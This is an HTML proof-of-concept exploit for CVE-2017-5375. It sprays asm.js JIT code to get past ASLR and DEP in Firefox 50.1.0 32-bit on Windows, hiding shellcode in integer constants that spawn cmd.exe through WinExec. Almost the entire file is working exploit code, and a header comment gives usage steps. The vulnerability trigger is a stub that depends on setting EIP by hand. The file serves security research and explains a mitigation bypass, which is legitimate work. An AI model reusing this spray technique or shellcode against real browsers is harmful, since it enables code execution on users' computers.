<!DOCTYPE HTML>
<html>

<!--

    FULL ASLR AND DEP BYPASS USING ASM.JS JIT SPRAY (CVE-2017-5375)
    WinExec("cmd.exe") PoC

    Tested on:

    Release 50.1.0 32-bit - Windows 8.1 / Windows 10
    https://ftp.mozilla.org/pub/firefox/releases/50.1.0/win32/en-US/Firefox%20Setup%2050.1.0.exe

    Howto:

    1) serve PoC over network and open it in Firefox 50.1.0
    2) set eip to 0x1c1c0053 and continue execution
    3) if you don't see cmd.exe, open processexplorer and verify that cmd.exe was spawned by firefox.exe

    Writeup: https://rh0dev.github.io/blog/2017/the-return-of-the-jit/
    
    (C) Rh0

    Jul. 13, 2017

-->

<head>
<meta charset=UTF-8 />
<script async>
function asm_js_module(){
    "use asm";
    function payload_code(){
        var val = 0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa85b306a)|0;
        val = (val + 0xa81b8b64)|0;
        val = (val + 0xa80c5b8b)|0;
        val = (val + 0xa81c5b8b)|0;
        val = (val + 0xa8b9006a)|0;
        val = (val + 0xa8904c4c)|0;
        val = (val + 0xa8902eb1)|0;
        val = (val + 0xa85144b5)|0;
        val = (val + 0xa8b99090)|0;
        val = (val + 0xa8903233)|0;
        val = (val + 0xa89045b1)|0;
        val = (val + 0xa8514cb5)|0;
        val = (val + 0xa8b99090)|0;
        val = (val + 0xa8904e52)|0;
        val = (val + 0xa8904bb1)|0;
        val = (val + 0xa85145b5)|0;
        val = (val + 0xa890e289)|0;
        val = (val + 0xa8590e6a)|0;
        val = (val + 0xa84fd789)|0;
        val = (val + 0xa8086b8b)|0;
        val = (val + 0xa820738b)|0;
        val = (val + 0xa8471b8b)|0;
        val = (val + 0xa827e349)|0;
        val = (val + 0xa890c031)|0;
        val = (val + 0xa890ad66)|0;
        val = (val + 0xa89c613c)|0;
        val = (val + 0xa8077c9d)|0;
        val = (val + 0xa890202c)|0;
        val = (val + 0xa89c073a)|0;
        val = (val + 0xa8d7749d)|0;
        val = (val + 0xa8b9bdeb)|0;
        val = (val + 0xa8906365)|0;
        val = (val + 0xa8905fb1)|0;
        val = (val + 0xa89078b5)|0;
        val = (val + 0xa808e9c1)|0;
        val = (val + 0xa8b99051)|0;
        val = (val + 0xa890456e)|0;
        val = (val + 0xa89057b1)|0;
        val = (val + 0xa85169b5)|0;
        val = (val + 0xa890eb89)|0;
        val = (val + 0xa83cc583)|0;
        val = (val + 0xa8006d8b)|0;
        val = (val + 0xa890dd01)|0;
        val = (val + 0xa878c583)|0;
        val = (val + 0xa8006d8b)|0;
        val = (val + 0xa890dd01)|0;
        val = (val + 0xa820458b)|0;
        val = (val + 0xa890d801)|0;
        val = (val + 0xa890d231)|0;
        val = (val + 0xa890e789)|0;
        val = (val + 0xa859086a)|0;
        val = (val + 0xa810348b)|0;
        val = (val + 0xa890de01)|0;
        val = (val + 0xa890a6f3)|0;
        val = (val + 0xa8900de3)|0;
        val = (val + 0xa804c283)|0;
        val = (val + 0xa890dbeb)|0;
        val = (val + 0xa8247d8b)|0;
        val = (val + 0xa890df01)|0;
        val = (val + 0xa890ead1)|0;
        val = (val + 0xa890d701)|0;
        val = (val + 0xa890d231)|0;
        val = (val + 0xa8178b66)|0;
        val = (val + 0xa81c7d8b)|0;
        val = (val + 0xa890df01)|0;
        val = (val + 0xa802e2c1)|0;
        val = (val + 0xa890d701)|0;
        val = (val + 0xa8903f8b)|0;
        val = (val + 0xa890df01)|0;
        val = (val + 0xa8b8006a)|0;
        val = (val + 0xa890646d)|0;
        val = (val + 0xa8905fb0)|0;
        val = (val + 0xa89063b4)|0;
        val = (val + 0xa808e8c1)|0;
        val = (val + 0xa8905450)|0;
        val = (val + 0xa890d7ff)|0;
        val = (val + 0xa81cc483)|0;
        val = (val + 0xa89090c3)|0;
        return val|0;
    }

    return payload_code 
}
</script>

<script>
function load_asmjs(){
    sprayed = []
    /* FIXME dynamically adjust this for target version */
    for (var i=0; i<= 0x1800; i++){
        sprayed[i] = asm_js_module()
    }

    trigger_vuln()
}

/* GET EIP CONTROL WITH YOUR VULN HERE */
/* SET EIP TO 0x1C1C0053 ON WINDOWS 32-bit*/
function trigger_vuln(){
    /* You may need to adjust this address dependent on your vuln and Firefox version*/
    alert("Set EIP to 0x1c1c0053 (Firefox Release <= 50.1.0 32-bit - Windows 8.1/10) with your vuln here or in WinDBG")
}

</script>
</head>
<body style=background:black onload=load_asmjs()>
<h2 style=color:green>
&#x03C1;
</h2>
</body>
</html>
